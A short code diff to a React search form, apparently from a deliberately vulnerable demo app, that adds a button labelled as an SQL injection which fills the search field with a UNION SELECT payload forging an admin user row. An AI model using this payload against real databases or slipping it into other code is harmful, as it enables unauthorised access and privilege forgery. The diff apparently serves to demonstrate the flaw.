@@ -198,6 +198,16 @@ function App() {
             onChange={(e) => setSearchQuery(e.target.value)}
           />
           <button type="submit">Search</button>
+          <div style={{ marginTop: '10px' }}>
+            <button 
+              type="button" 
+              onClick={() => {
+                setSearchQuery("' UNION SELECT 999, 'hacked_admin', 'fake_hash', 'admin' --");
+              }}
+            >
+              SQLi: Inject Fake Admin
+            </button>
+          </div>
         </form>
         {searchResults.length > 0 && (
           <ul>
